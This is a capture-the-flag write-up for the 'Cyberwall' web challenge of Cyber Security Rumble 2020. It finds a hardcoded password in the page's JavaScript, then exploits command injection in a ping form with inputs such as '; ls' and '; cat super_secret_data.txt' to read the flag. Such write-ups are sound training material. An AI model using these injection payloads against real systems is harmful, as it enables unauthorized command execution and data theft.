---
layout: post
title: "Cyberwall - Cyber Security Rumble CTF 2020"
author: cryptax
tags:
- CSR
- CTF
- 2020
- Web
---

# Cyberwall

- Category: web

*"We had problems with hackers, but now we got a enterprise firewall system build by a leading security company."* with a link to http://chal.cybersecurityrumble.de:3812.

## Web page http://chal.cybersecurityrumble.de:3812

The source code of the page reveals password `rootpw1337`:

```html

<!DOCTYPE html>
<html lang="de">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" type="text/css" href="/static/login.css">
        <title>Cyberwall</title>
    </head>
    <body>
        <script type="text/javascript">
            function checkPw() {
              var pass = document.getElementsByName('passwd')[0].value;
              if (pass != "rootpw1337") {
                alert("This Password is invalid!");
                return false;
              }
              window.location.replace("management.html");
            }
...
```

## Debugging

The debugging section has an HTTP form with a text to submit (POST):

```html
<h1>Test Host Connection</h1>
<p>Send a ping to a host, to heck your connection.</p>
<form method="POST">
    <input type="text" name="target">
    <input type="submit" value="Ping!" />
</form>
```

The input of *text* is not correctly sanitized, so we try: `; ls`:

![](/images/csr20-cyberwall-ping.png)

Then, we try `; cat super_secret_data.txt`, which provides:

```
CSR{oh_damnit_should_have_banned_curl_https://news.ycombinator.com/item?id=19507225}
```

This is the flag :)
